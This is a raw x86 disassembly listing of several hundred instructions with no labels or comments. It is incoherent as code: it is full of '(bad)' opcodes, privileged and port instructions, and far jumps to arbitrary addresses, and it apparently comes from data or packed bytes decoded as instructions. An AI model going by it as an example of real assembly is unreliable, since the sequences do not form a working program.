  4304d0:	cmp    BYTE PTR ds:[ebx-0x38578bc7],cl
  4304d7:	jg     0x43053d
  4304d9:	and    eax,0x825d5d24
  4304de:	out    dx,al
  4304df:	inc    esi
  4304e0:	push   edx
  4304e1:	jae    0x430476
  4304e3:	cmp    esp,DWORD PTR [ecx+eiz*2-0x3b]
  4304e7:	adc    al,0xc9
  4304e9:	mov    dl,0x9
  4304eb:	repz and DWORD PTR [edx+ebp*8-0x43e4b0e7],ebx
  4304f3:	pop    ss
  4304f4:	sahf   
  4304f5:	mov    WORD PTR [ebx-0x39],ds
  4304f8:	jns    0x430548
  4304fa:	lods   al,BYTE PTR ds:[esi]
  4304fb:	into   
  4304fc:	lods   eax,DWORD PTR ds:[esi]
  4304fd:	pusha  
  4304fe:	push   edx
  4304ff:	popf   
  430500:	jecxz  0x4304f5
  430502:	cwde   
  430503:	mov    dh,0x7e
  430505:	jns    0x4304f5
  430507:	xor    ebx,DWORD PTR [edi+0x537a0a7f]
  43050d:	and    dl,ah
  43050f:	mov    ds:0xadfca358,eax
  430514:	adc    al,0xd2
  430516:	jbe    0x430543
  430518:	or     eax,0xd7d2ee6a
  43051d:	mov    ds:0x6edcc237,eax
  430522:	mov    bh,0xa1
  430524:	lock push esi
  430526:	pop    eax
  430527:	std    
  430528:	pop    ds
  430529:	dec    esp
  43052a:	sahf   
  43052b:	outs   dx,BYTE PTR ds:[esi]
  43052c:	std    
  43052d:	test   al,0x3
  43052f:	xchg   DWORD PTR [edx+0x10],edx
  430532:	lea    esi,[eax]
  430534:	pop    esi
  430535:	cld    
  430536:	fld    st(6)
  430539:	cmp    al,0x4e
  43053b:	icebp  
  43053c:	or     DWORD PTR [ecx-0x7],esp
  43053f:	xchg   esi,eax
  430540:	or     bh,BYTE PTR [edi-0x67]
  430543:	inc    edi
  430544:	lods   eax,DWORD PTR ds:[esi]
  430545:	jne    0x430534
  430547:	cmp    DWORD PTR [ebp+0x764f5e1c],0xfffffff2
  43054e:	push   esi
  43054f:	xor    dl,0xa4
  430552:	fcomp  DWORD PTR [ecx+0x746eb3bf]
  430558:	pop    esi
  430559:	inc    edx
  43055a:	jmp    0xeb889c46
  43055f:	adc    al,0x55
  430561:	or     al,0x72
  430563:	sbb    ecx,ebp
  430565:	test   al,0x87
  430567:	mov    esp,0x82eb613a
  43056c:	lahf   
  43056d:	mov    eax,0xd82d7602
  430572:	pop    si
  430574:	pop    ebx
  430575:	outs   dx,BYTE PTR ds:[esi]
  430577:	das    
  430578:	loope  0x430523
  43057a:	outs   dx,BYTE PTR ds:[esi]
  43057b:	or     edi,DWORD PTR [ebx]
  43057d:	invd   
  43057f:	mov    eax,ds:0x48e2f341
  430584:	rcl    edx,cl
  430586:	inc    esp
  430587:	fidivr WORD PTR [edx]
  430589:	inc    ecx
  43058a:	outs   dx,BYTE PTR ds:[esi]
  43058b:	xchg   edi,eax
  43058c:	pop    esi
  43058d:	mov    eax,0x462457d4
  430592:	sbb    al,0xa1
  430594:	mov    edx,0x8c114533
  430599:	sub    DWORD PTR [ebx],ebp
  43059b:	and    BYTE PTR [ebp+ecx*1-0x73],ah
  43059f:	mov    BYTE PTR [esi],dh
  4305a1:	inc    ecx
  4305a2:	push   0x7f
  4305a4:	adc    bl,BYTE PTR [esi-0x1c]
  4305a7:	mov    esp,0xa1904103
  4305ac:	leave  
  4305ad:	push   es
  4305ae:	das    
  4305af:	jmp    FWORD PTR [esi]
  4305b1:	icebp  
  4305b2:	out    dx,al
  4305b3:	mov    ch,0x26
  4305b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4305b6:	jp     0x43059b
  4305b8:	loopne 0x430589
  4305ba:	and    BYTE PTR [ecx-0x5b51d197],ah
  4305c0:	cmp    DWORD PTR [ebp-0x47a05f81],eax
  4305c6:	jae    0x4305a4
  4305c8:	dec    edx
  4305c9:	push   ecx
  4305ca:	pop    edx
  4305cb:	cmp    DWORD PTR [edx],esi
  4305cd:	push   cs
  4305ce:	fsubr  DWORD PTR [eax+0x5dedf887]
  4305d4:	jnp    0x43056b
  4305d6:	sbb    DWORD PTR [ecx+0x70619cb3],esi
  4305dc:	addr16 jne 0x430582
  4305df:	mov    WORD PTR [edi],fs
  4305e1:	mov    ch,dh
  4305e3:	retf   
  4305e4:	jecxz  0x4305b6
  4305e6:	lock test eax,0x6225fc78
  4305ec:	fisub  WORD PTR [ebx-0x643fcc04]
  4305f2:	out    dx,al
  4305f3:	mov    bl,0x39
  4305f5:	or     al,BYTE PTR [ebx-0x16]
  4305f8:	int    0x68
  4305fa:	xchg   ebx,eax
  4305fb:	rcr    esi,1
  4305fd:	push   edi
  4305fe:	cmp    BYTE PTR [eax],0xa5
  430601:	push   ecx
  430602:	pushf  
  430603:	adc    esi,DWORD PTR [esi+eax*4-0x12]
  430607:	mov    eax,eax
  430609:	fstp   QWORD PTR [edx+0xb]
  43060c:	pop    edx
  43060d:	jo     0x430679
  43060f:	cmp    DWORD PTR [edi],0x5d
  430612:	cmp    cl,BYTE PTR [eax*1+0x5260c57b]
  430619:	aaa    
  43061a:	icebp  
  43061b:	lods   al,BYTE PTR ds:[esi]
  43061c:	pop    ebp
  43061d:	rol    DWORD PTR [ebx],cl
  43061f:	adc    BYTE PTR [ebp-0x75bb94f7],0x8
  430626:	mov    ds:0x5e4260a1,eax
  43062b:	jmp    0x4306a0
  43062d:	ficomp WORD PTR [ebx-0xe]
  430630:	aaa    
  430631:	loopne 0x4305c1
  430633:	and    DWORD PTR [ebx+0x1d],ebx
  430636:	mov    dh,0xf5
  430638:	pushw  0xa0ab
  43063c:	(bad)  
  43063d:	fmul   DWORD PTR [ebx-0x34]
  430640:	(bad)  
  430641:	xor    al,0x34
  430643:	inc    ecx
  430644:	pop    esi
  430645:	call   0x70fd:0xbf61020b
  43064c:	shl    BYTE PTR [eax+0x5553dc20],1
  430652:	add    edi,edx
  430654:	pop    ebp
  430655:	cmp    al,0x2f
  430657:	jbe    0x43066c
  430659:	(bad)  
  43065a:	jnp    0x4306c6
  43065c:	jp     0x4305e3
  43065e:	and    DWORD PTR [ecx-0x29f6a0b2],esp
  430664:	inc    ecx
  430665:	push   edi
  430666:	imul   ebp,esp,0xb0c8335b
  43066c:	int3   
  43066d:	jmp    0xae8:0xc11e109c
  430674:	stos   DWORD PTR es:[edi],eax
  430675:	and    eax,ecx
  430677:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430678:	in     al,0xce
  43067a:	mov    ah,0xb1
  43067c:	xor    esp,DWORD PTR [edx]
  43067e:	scas   al,BYTE PTR es:[edi]
  43067f:	shr    DWORD PTR ds:[ebp-0x3ea186a6],1
  430686:	fld    QWORD PTR [ebx+0x5b]
  430689:	and    DWORD PTR [edx+0x9],ebp
  43068c:	shl    DWORD PTR [eax-0x59],cl
  43068f:	xor    al,0x49
  430691:	and    bh,BYTE PTR [esi-0x37]
  430694:	mov    cl,0x30
  430696:	out    dx,al
  430697:	imul   ecx,DWORD PTR [edx+edi*4],0xdb63da44
  43069e:	inc    edx
  43069f:	mov    eax,ds:0x17d6498a
  4306a4:	gs pop esi
  4306a6:	je     0x430691
  4306a8:	pop    esi
  4306a9:	adc    dl,BYTE PTR [edx-0x784590d2]
  4306af:	and    al,0x71
  4306b1:	pusha  
  4306b2:	mov    DWORD PTR [edi+0x3f94c8d2],esp
  4306b8:	pop    ecx
  4306b9:	xchg   ebx,eax
  4306ba:	out    dx,al
  4306bb:	pop    es
  4306bc:	jle    0x4306c6
  4306be:	sbb    eax,0xb5a1318b
  4306c3:	and    BYTE PTR [eax+0x71e2f65f],0x77
  4306ca:	arpl   WORD PTR [edx-0x5f],bp
  4306cd:	xchg   esp,eax
  4306ce:	add    bh,BYTE PTR [edx+0x5f]
  4306d1:	xor    eax,ecx
  4306d3:	push   esp
  4306d4:	call   0xbf08:0xdb758296
  4306db:	mov    al,ds:0x301ce415
  4306e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4306e1:	sub    al,0xf0
  4306e3:	fsubr  DWORD PTR [edi]
  4306e5:	shr    esp,cl
  4306e7:	int    0x9d
  4306e9:	mov    dl,0x77
  4306eb:	and    ebx,DWORD PTR [esi]
  4306ed:	inc    ecx
  4306ee:	mov    BYTE PTR [esi+0x63],ch
  4306f1:	(bad)  
  4306f2:	jne    0x4306f4
  4306f4:	mov    al,ds:0xd0e102be
  4306f9:	and    BYTE PTR [eax+0x51],bl
  4306fc:	push   0x60
  4306fe:	les    esi,FWORD PTR [edx]
  430700:	enter  0xbb7d,0x9f
  430704:	push   edi
  430705:	mov    bh,0xee
  430707:	dec    ecx
  430708:	mov    al,ds:0x2406b761
  43070d:	jns    0x430753
  43070f:	mov    eax,ds:0xabe0603c
  430714:	push   ebx
  430715:	sbb    bh,BYTE PTR [ecx+0xf]
  430718:	cmp    edi,DWORD PTR [esi]
  43071a:	mov    ebx,0xa141b2ee
  43071f:	popa   
  430720:	in     eax,dx
  430721:	ror    BYTE PTR [edx+0x3f],cl
  430724:	mov    ebp,0x5e92a67a
  430729:	out    dx,eax
  43072a:	icebp  
  43072b:	or     eax,0xbdb21a40
  430730:	ss popa 
  430732:	stc    
  430733:	sub    edi,DWORD PTR [ebp+0x4c]
  430736:	data16 jp 0x4307b7
  430739:	call   0xd5a173bc
  43073e:	xchg   ebp,eax
  43073f:	cli    
  430740:	inc    eax
  430741:	mul    BYTE PTR [ebp+0x3f60afff]
  430747:	and    edi,edi
  430749:	and    esp,DWORD PTR [ebx-0x11ed64d3]
  43074f:	ret    
  430750:	ins    BYTE PTR es:[di],dx
  430752:	int    0x74
  430754:	mov    ebp,ecx
  430756:	adc    DWORD PTR [eax+eax*1-0x5c4ea690],esp
  43075d:	mov    cl,0x56
  43075f:	nop
  430760:	and    al,0x98
  430762:	dec    eax
  430764:	ins    BYTE PTR es:[edi],dx
  430765:	mov    DWORD PTR [eax-0x6d],0xe571e075
  43076c:	mov    fs,ecx
  43076e:	out    0x86,eax
  430770:	pop    eax
  430771:	and    ebx,DWORD PTR [ecx]
  430773:	jno    0x430722
  430775:	pusha  
  430776:	adc    BYTE PTR [edi+edx*8-0x6e],al
  43077a:	mul    BYTE PTR [edx-0x650d02a9]
  430780:	cmp    BYTE PTR [eax],ah
  430782:	pop    ebp
  430783:	or     DWORD PTR [eax+0x709a3b5b],esp
  430789:	adc    BYTE PTR [edi-0x5f],ch
  43078c:	mov    ecx,0x72b57f82
  430791:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430792:	out    dx,al
  430793:	inc    ebp
  430794:	cmp    ch,BYTE PTR [edi]
  430796:	or     al,0xa4
  430798:	xchg   edx,eax
  430799:	and    DWORD PTR [esi-0xd9eef16],ebp
  43079f:	push   es
  4307a0:	xor    eax,0x17180025
  4307a5:	lock jmp 0x43072a
  4307a8:	das    
  4307a9:	cwde   
  4307aa:	repz jecxz 0x4307d9
  4307ad:	repnz dec ebp
  4307af:	inc    ecx
  4307b0:	ss push edx
  4307b2:	pop    ebp
  4307b3:	and    DWORD PTR [esi-0x495ebc1f],edx
  4307b9:	push   edi
  4307ba:	ds mov esi,0xbd9a1faf
  4307c0:	xor    eax,0xcd15789b
  4307c5:	out    0x7c,al
  4307c7:	test   al,0x69
  4307c9:	push   ss
  4307ca:	push   ds
  4307cb:	jmp    0x4307bb
  4307cd:	stc    
  4307ce:	aaa    
  4307cf:	fisub  DWORD PTR [eax-0x15265aa0]
  4307d5:	int    0xfe
  4307d7:	add    cl,BYTE PTR [bx+si+0x474a]
  4307dc:	pop    esi
  4307dd:	ja     0x4307d3
  4307df:	and    ebx,DWORD PTR [ebx-0x4e]
  4307e2:	(bad)  
  4307e3:	cdq    
  4307e4:	scas   eax,DWORD PTR es:[edi]
  4307e5:	adc    al,0x7
  4307e7:	sub    BYTE PTR [esi-0x74],bl
  4307ea:	xlat   BYTE PTR ds:[ebx]
  4307eb:	push   esi
  4307ec:	je     0x43079a
  4307ee:	jne    0x430833
  4307f0:	pop    esi
  4307f1:	fidivr DWORD PTR [ebx+ebp*2]
  4307f4:	jo     0x430778
  4307f6:	mov    esi,0xb5b9221
  4307fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4307fc:	or     DWORD PTR [eax+0x15],ebx
  4307ff:	and    DWORD PTR [ebp-0x2e],esp
  430802:	(bad)  
  430804:	pop    ebx
  430805:	xchg   esp,eax
  430806:	pop    esp
  430807:	inc    ebp
  430808:	jmp    0x4307d4
  43080a:	cs dec eax
  43080c:	add    eax,0x47a15fd6
  430811:	nop
  430812:	hlt    
  430813:	sbb    BYTE PTR [eax+0x5b6058b6],bh
  430819:	adc    ebp,eax
  43081b:	cmp    dl,BYTE PTR [ebp+0x24]
  43081e:	jle    0x430885
  430820:	adc    ebp,DWORD PTR ds:0x7ce8a148
  430826:	fistp  QWORD PTR es:[ebp+0x3]
  43082a:	int    0x5e
  43082c:	clc    
  43082d:	loope  0x430822
  43082f:	pop    ds
  430830:	inc    ebp
  430831:	add    eax,0x13c42100
  430836:	xchg   ebx,eax
  430837:	dec    ebp
  430838:	cmp    al,0x5a
  43083a:	push   edi
  43083b:	das    
  43083c:	add    DWORD PTR [esi],0xffffff88
  43083f:	inc    ecx
  430840:	lldt   WORD PTR [ebx+0x339a5edd]
  430847:	int    0x7d
  430849:	sub    ecx,DWORD PTR [edi]
  43084b:	pop    esi
  43084c:	push   0x5ddf1b5e
  430851:	pushf  
  430852:	push   ebx
  430853:	arpl   WORD PTR [esi+0x16],si
  430856:	cmp    eax,ebx
  430858:	arpl   WORD PTR [edx-0x46],cx
  43085b:	mov    bh,0x48
  43085d:	(bad)  
  43085e:	jnp    0x43089c
  430860:	adc    al,0x21
  430862:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430863:	xchg   ebp,eax
  430864:	rcpps  xmm2,xmm7
  430867:	je     0x43081e
  430869:	das    
  43086a:	scas   al,BYTE PTR es:[edi]
  43086b:	aad    0xf3
  43086d:	push   ds
  43086e:	jno    0x4308aa
  430870:	pop    esi
  430871:	xor    ch,BYTE PTR [ebp+0x2c]
  430874:	(bad)  
  430875:	add    al,0x24
  430877:	cmp    al,0x99
  430879:	and    al,0x3d
  43087b:	mov    eax,ds:0xe5e9a951
  430880:	repnz push ecx
  430882:	sbb    BYTE PTR [esi],bl
  430884:	pop    esi
  430885:	xor    BYTE PTR [ebx+0x36fb9d86],0xef
  43088c:	and    DWORD PTR [ebx],0xffffffc5
  43088f:	mov    al,ds:0x8456b5f3
  430894:	into   
  430895:	ror    esi,1
  430897:	repz pop esi
  430899:	sub    esi,DWORD PTR [edx+0x45]
  43089c:	cwde   
  43089d:	inc    edx
  43089e:	push   ds
  43089f:	out    dx,eax
  4308a0:	adc    DWORD PTR [ebx-0x1d],eax
  4308a3:	fcom   DWORD PTR ds:0x64686ae1
  4308a9:	mov    WORD PTR [eax-0x46a2a062],fs
  4308af:	xchg   ecx,eax
  4308b0:	std    
  4308b1:	cs fs dec ebp
  4308b4:	sahf   
  4308b5:	cmp    al,0x51
  4308b7:	pop    ebp
  4308b8:	and    DWORD PTR [eax+0x75],0xffffffb2
  4308bc:	loope  0x4308c8
  4308be:	xlat   BYTE PTR ds:[ebx]
  4308bf:	add    al,0xea
  4308c1:	jbe    0x4308e2
  4308c3:	aad    0xc1
  4308c5:	fist   WORD PTR [edx-0x2c]
  4308c8:	push   0x22
  4308ca:	mov    al,ds:0x4effa265
  4308cf:	scas   eax,DWORD PTR es:[edi]
  4308d0:	pop    edx
  4308d1:	adc    ch,dh
  4308d3:	pop    esp
  4308d4:	imul   edi,edx,0x920b0b93
  4308da:	out    dx,al
  4308db:	rcl    BYTE PTR [esi],0x78
  4308de:	in     al,0xbd
  4308e0:	or     eax,0xb5a0ac07
  4308e5:	mov    eax,gs:0xd895db77
  4308eb:	mov    eax,0x76823563
  4308f0:	out    0x0,eax
  4308f2:	test   eax,0x1bafb94e
  4308f7:	mov    eax,ds:0x50bd6286
  4308fc:	add    esp,DWORD PTR [edi+edx*2-0xb]
  430900:	in     eax,dx
  430901:	enter  0xfdee,0xcf
  430905:	xor    bh,dl
  430907:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430908:	outs   dx,BYTE PTR ds:[esi]
  430909:	push   esi
  43090a:	dec    edi
  43090b:	mov    ds,WORD PTR [eax-0x2e1de407]
  430911:	push   esp
  430912:	arpl   WORD PTR [esi+edx*1],sp
  430915:	lods   eax,DWORD PTR ds:[esi]
  430916:	imul   edx,DWORD PTR [edx+esi*1+0x5a166c8],0x38aa906f
  430921:	in     al,dx
  430922:	mov    al,BYTE PTR [ecx-0x2b]
  430925:	std    
  430926:	mov    al,ds:0x1512c88d
  43092b:	popa   
  43092c:	and    DWORD PTR [ecx+edi*2-0x1efdb6f3],0xae2b5322
  430937:	pop    edi
  430938:	fiadd  WORD PTR [esi]
  43093a:	jnp    0x430906
  43093c:	dec    edx
  43093d:	push   ebx
  43093e:	nop
  43093f:	mov    eax,ds:0x8af5c27c
  430944:	jbe    0x43097e
  430946:	loope  0x4308de
  430948:	dec    ebx
  430949:	push   0x945efb1b
  43094e:	adc    DWORD PTR [ecx],ebx
  430950:	leave  
  430951:	jne    0x43090b
  430953:	mov    al,ds:0x8b911407
  430958:	mov    dl,0x45
  43095a:	inc    edi
  43095b:	call   FWORD PTR [esi+0x13]
  43095e:	test   BYTE PTR [eax],ch
  430960:	lahf   
  430961:	(bad)
  430965:	inc    ebx
  430966:	pop    es
  430967:	(bad)  
  430968:	pop    ds
  430969:	mov    eax,ds:0x9b54a94e
  43096e:	push   esi
  43096f:	jbe    0x4309cf
  430971:	push   cs
  430972:	jmp    0x54528d95
  430977:	lds    esp,FWORD PTR [ecx+0x69]
  43097a:	adc    edi,DWORD PTR [esi-0x5b235fb5]
  430980:	push   ebx
  430981:	clc    
  430982:	adc    eax,0x717bbf21
  430987:	and    bl,BYTE PTR [esi+0x1d]
  43098a:	icebp  
  43098b:	retf   
  43098c:	xchg   bl,ch
  43098e:	or     eax,0x975e1800
  430993:	mov    al,0x49
  430995:	ret    
  430996:	add    eax,0xf6d99e8d
  43099b:	mov    bl,0x37
  43099d:	loope  0x4309f4
  43099f:	and    ebp,ebx
  4309a1:	js     0x43095e
  4309a3:	xor    edi,DWORD PTR [ebx-0x66]
  4309a6:	mov    ebp,0xaa47cda5
  4309ab:	push   ds
  4309ac:	stos   BYTE PTR es:[edi],al
  4309ad:	loopne 0x430951
  4309af:	adc    BYTE PTR [ebx-0x6e7cdabf],bh
  4309b5:	loopne 0x430a1c
  4309b7:	cmp    eax,0x1df9abcf
  4309bc:	xchg   edx,eax
  4309bd:	pop    ebp
  4309be:	ins    BYTE PTR es:[edi],dx
  4309bf:	jnp    0x4309eb
  4309c1:	mov    eax,ds:0xb3aebc73
  4309c6:	ja     0x43094d
  4309c8:	arpl   WORD PTR [edi-0x7f],ax
  4309cb:	nop
  4309cc:	mul    eax
  4309ce:	jnp    0x4309fc
  4309d0:	xchg   DWORD PTR [ebp+ecx*8-0x68a16960],ecx
  4309d7:	inc    ecx
  4309d8:	xchg   ecx,eax
  4309d9:	fs mov edx,0xdb8c5e76
  4309df:	adc    al,0x25
  4309e1:	sub    dl,bl
  4309e3:	adc    bh,BYTE PTR [eax]
  4309e5:	popa   
  4309e6:	mov    WORD PTR [ebp+0x2d],?
  4309e9:	inc    eax
  4309ea:	ins    DWORD PTR es:[edi],dx
  4309eb:	mov    DWORD PTR [ebp-0x41],esp
  4309ee:	and    esi,DWORD PTR [edi+0x70]
  4309f1:	pusha  
  4309f2:	fnop   
  4309f4:	je     0x4309d9
  4309f6:	xchg   ebx,eax
  4309f7:	(bad)  
  4309f9:	dec    esi
  4309fa:	mul    DWORD PTR [esi-0x5e059f92]
  430a00:	xrstors [edi+0x2f325ea3]
  430a07:	mov    dh,0xc
  430a09:	pop    ds
  430a0a:	dec    esi
  430a0b:	pop    eax
  430a0c:	mov    WORD PTR [edx+0x2843a168],?
  430a12:	pop    edx
  430a13:	mov    ebp,DWORD PTR [eax]
  430a15:	inc    ebx
  430a16:	fmul   DWORD PTR [edi+esi*1]
  430a19:	btr    DWORD PTR [ebp+eiz*2+0x42],ebx
  430a1e:	in     al,0xf1
  430a20:	xor    bh,ch
  430a22:	mov    dh,0x1e
  430a24:	pop    esi
  430a25:	pop    ebp
  430a26:	mov    al,0x3f
  430a28:	push   DWORD PTR [ebp-0x8086fcc]
  430a2e:	inc    esi
  430a2f:	loope  0x430a4d
  430a31:	push   esp
  430a32:	sub    al,0x3d
  430a34:	ds imul dh
  430a37:	mov    ds:0xdd55cb8e,eax
  430a3c:	out    0xcc,eax
  430a3e:	cmp    eax,0xbf3623a1
  430a43:	mov    bl,0xbc
  430a45:	data16 fiadd DWORD PTR [ecx+0x2af3355e]
  430a4c:	mov    ch,0xfe
  430a4e:	xchg   ebp,eax
  430a4f:	mov    bl,0xf2
  430a51:	pusha  
  430a52:	jp     0x4309f9
  430a54:	sub    al,0x13
  430a56:	imul   edi,esi,0x3fbebaa2
  430a5c:	mov    ds:0xded2ee23,eax
  430a61:	fwait
  430a62:	or     ebp,DWORD PTR [ebx]
  430a64:	add    esp,DWORD PTR [edx]
  430a66:	xor    esp,DWORD PTR [edx-0x7250e8e9]
  430a6c:	pop    edi
  430a6d:	jg     0x430a72
  430a6f:	ins    DWORD PTR es:[edi],dx
  430a70:	or     edx,DWORD PTR [ecx-0x6b4ff815]
  430a76:	ror    ebp,1
  430a78:	cmp    cl,dh
  430a7a:	add    ch,BYTE PTR [edi+0x78]
  430a7d:	pop    ecx
  430a7e:	sub    BYTE PTR ds:0xb0dbc49d,dh
  430a84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430a85:	adc    edi,esi
  430a87:	push   ds
  430a88:	pop    esi
  430a89:	mov    ah,0x93
  430a8b:	fnsave [edx+ebx*1+0x5e0386c9]
  430a92:	mov    ebp,0x35c9c963
  430a97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430a98:	fisttp QWORD PTR [eax+0x45]
  430a9b:	jne    0x430a20
  430a9d:	gs out dx,eax
  430a9f:	inc    ebp
  430aa0:	fadd   st(2),st
  430aa2:	bound  eax,QWORD PTR [ecx-0x66]
  430aa5:	push   ecx
  430aa6:	sbb    ebx,DWORD PTR [ecx]
  430aa8:	fbld   TBYTE PTR [eax-0x45]
  430aab:	fbstp  TBYTE PTR [edx]
  430aad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430aae:	ds popf 
  430ab0:	dec    edi
  430ab1:	sub    ebp,esi
  430ab3:	or     DWORD PTR [eax+0x33],esi
  430ab6:	out    0x84,eax
  430ab8:	push   edx
  430ab9:	pop    eax
  430aba:	jae    0x430a64
  430abc:	data16 fisubr WORD PTR [esi-0x59]
  430ac0:	int    0x10
  430ac2:	in     eax,0x6c
  430ac4:	out    dx,al
  430ac5:	sbb    edx,DWORD PTR [edx-0x80]
  430ac8:	dec    ebx
  430ac9:	iret   
  430aca:	mov    edi,0x68295eff
  430acf:	and    al,0x27
  430ad1:	stos   DWORD PTR es:[edi],eax
  430ad2:	or     esp,DWORD PTR [ecx+0x723bfbc6]
  430ad8:	add    eax,0x86a08d03
  430add:	aam    0x21
  430adf:	inc    esp
  430ae0:	(bad)  
  430ae2:	fist   DWORD PTR [esi]
  430ae4:	and    BYTE PTR [edi],al
  430ae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430ae7:	xchg   esp,eax
  430ae8:	mov    DWORD PTR [eax-0x28],esp
  430aeb:	out    0x50,eax
  430aed:	mov    cl,BYTE PTR [ebx-0x3]
  430af0:	aam    0xa9
  430af2:	out    dx,al
  430af3:	mov    eax,ds:0x74f2de94
  430af8:	sahf   
  430af9:	inc    ebp
  430afa:	jecxz  0x430ac4
  430afc:	call   0x5ef5:0x3db4ee46
  430b03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430b04:	mov    dh,0x75
  430b06:	jmp    0x430b4e
  430b08:	adc    eax,0xf12bdef4
  430b0d:	nop
  430b0e:	ret    
  430b0f:	mov    BYTE PTR [ecx],dl
  430b11:	pop    edi
  430b12:	pop    ds
  430b13:	adc    eax,0xe032207f
  430b18:	push   ds
  430b19:	rcl    esp,cl
  430b1b:	mov    es,WORD PTR [esi+ebp*8-0x59]
  430b1f:	jmp    0x7895:0x7d130a5e
  430b26:	mov    edi,0xd3e745a5
  430b2b:	fwait
  430b2c:	add    DWORD PTR [ecx],eax
  430b2e:	push   cs
  430b2f:	mov    BYTE PTR [edi+ebx*1],dh
  430b32:	xor    eax,0x904378a4
  430b37:	or     eax,0x16f9b0d0
  430b3c:	pop    eax
  430b3d:	das    
  430b3e:	stos   DWORD PTR es:[edi],eax
  430b3f:	mov    al,ds:0x986ae88c
  430b44:	mov    al,0x40
  430b46:	pop    esp
  430b47:	fiadd  DWORD PTR [ecx-0x4f3dd27]
  430b4d:	push   edi
  430b4e:	or     ebp,edi
  430b50:	std    
  430b51:	mov    al,ds:0x6154d6a9
  430b56:	test   bl,al
  430b58:	xor    DWORD PTR [ecx+ebx*8+0x18],edx
  430b5c:	xlat   BYTE PTR ds:[ebx]
  430b5d:	or     al,0xee
  430b5f:	mov    eax,0xff426a50
  430b64:	jb     0x430b1d
  430b66:	dec    edi
  430b67:	call   0x4a63:0x50246f06
  430b6e:	into   
  430b6f:	sbb    BYTE PTR [ebx-0x10],ch
  430b72:	adc    al,0x65
  430b74:	pop    esi
  430b75:	lock push edx
  430b77:	sbb    al,0x3b
  430b79:	out    0xb1,eax
  430b7b:	pushf  
  430b7c:	gs fs pop eax
  430b7f:	cdq    
  430b80:	(bad)  [esi]
  430b82:	adc    BYTE PTR [edi-0x25],bl
  430b85:	ds (bad) 
  430b87:	mov    al,0xf1
  430b89:	mov    ebx,0xb95ee5a6
  430b8e:	inc    edi
  430b8f:	repnz or ecx,ebx
  430b92:	into   
  430b93:	xor    al,0x3b
  430b95:	arpl   ax,di
  430b97:	and    dh,BYTE PTR [ebx-0x5a741146]
  430b9d:	lock ror bl,1
  430ba0:	xor    bh,BYTE PTR [edi+0x4c]
  430ba3:	mov    bh,0x5e
  430ba5:	imul   edx,ecx,0xcaa06f7c
  430bab:	jmp    0xb6256c63
  430bb0:	sbb    bh,bl
  430bb2:	je     0x430c33
  430bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430bb5:	das    
  430bb6:	out    dx,al
  430bb7:	data16 fiadd DWORD PTR [ecx-0xd]
  430bbb:	rol    dl,0xbb
  430bbe:	jecxz  0x430b69
  430bc0:	fisttp QWORD PTR ds:0x87cf14f5
  430bc6:	out    dx,al
  430bc7:	and    BYTE PTR cs:[ebp-0x5b],al
  430bcb:	loope  0x430c2b
  430bcd:	(bad)  
  430bce:	int3   
  430bcf:	inc    edx
  430bd0:	and    eax,0x9f25f647
  430bd5:	pop    ebx
  430bd6:	pusha  
  430bd7:	adc    BYTE PTR [ecx],cl
  430bd9:	cs and eax,0x3030c568
  430bdf:	adc    edx,ebp
  430be1:	mov    edi,esp
  430be3:	mov    ebp,0x6af65b5a
  430be8:	outs   dx,BYTE PTR ds:[esi]
  430be9:	inc    ecx
  430bea:	push   es
  430beb:	stos   DWORD PTR es:[edi],eax
  430bec:	rcr    BYTE PTR [ecx-0x1e],1
  430bef:	retf   0x4026
  430bf2:	ss icebp 
  430bf4:	push   esp
  430bf5:	gs mov esp,0xb96939e1
  430bfb:	into   
  430bfc:	out    dx,eax
  430bfd:	pusha  
  430bfe:	mov    ds:0xf0aa0c8d,eax
  430c03:	scas   al,BYTE PTR es:[edi]
  430c04:	pop    esi
  430c05:	ss sbb ebx,ebx
  430c08:	dec    edx
  430c09:	in     al,dx
  430c0a:	test   BYTE PTR [edi],0x5c
  430c0d:	popa   
  430c0e:	mov    ecx,0xbce1e566
  430c13:	inc    ecx
  430c14:	rcl    BYTE PTR [ecx+eax*1],1
  430c17:	adc    al,0xfc
  430c19:	(bad)  
  430c1a:	cs mov edx,0x3eb4c65f
  430c20:	xor    DWORD PTR [ecx+0x3f79a15d],esi
  430c26:	je     0x430c1f
  430c28:	sub    eax,0x5e8bcbdf
  430c2d:	aam    0xe8
  430c2f:	sub    BYTE PTR [eax],al
  430c31:	pusha  
  430c32:	push   esi
  430c33:	outs   dx,DWORD PTR gs:[esi]
  430c35:	pusha  
  430c36:	test   cl,al
  430c38:	imul   esp,DWORD PTR [eax+edx*2-0x24],0x21
  430c3d:	sub    dh,0x89
  430c40:	cmp    al,0x11
  430c42:	fstp   QWORD PTR [ebx]
  430c44:	mov    eax,ds:0xc1a11155
  430c49:	dec    eax
  430c4a:	stos   DWORD PTR es:[edi],eax
  430c4b:	fmul   DWORD PTR [edi+eiz*4+0x22]
  430c4f:	mov    cl,0x37
  430c51:	sti    
  430c52:	(bad)  
  430c53:	and    esi,edi
  430c55:	imul   ebx,DWORD PTR [ebp+0x2b9277eb],0xffffffa8
  430c5c:	pop    esp
  430c5d:	xor    cl,ch
  430c5f:	sbb    ecx,0xbb8512a0
  430c65:	fs out 0x83,al
  430c68:	pop    esi
  430c69:	and    DWORD PTR [ebp+0x3d46b8c6],edi
  430c6f:	bnd jb 0x430c76
  430c72:	add    esp,edi
  430c74:	pop    esi
  430c75:	and    DWORD PTR ss:0x7d5136f9,ecx
  430c7c:	pop    esi
  430c7d:	xchg   ebx,eax
  430c7e:	inc    ecx
  430c7f:	stos   BYTE PTR es:[edi],al
  430c80:	sub    ch,al
  430c82:	and    BYTE PTR [eax+0x25c05dff],bh
  430c88:	jge    0x430c7a
  430c8a:	les    ecx,FWORD PTR [esi-0x68ce8b32]
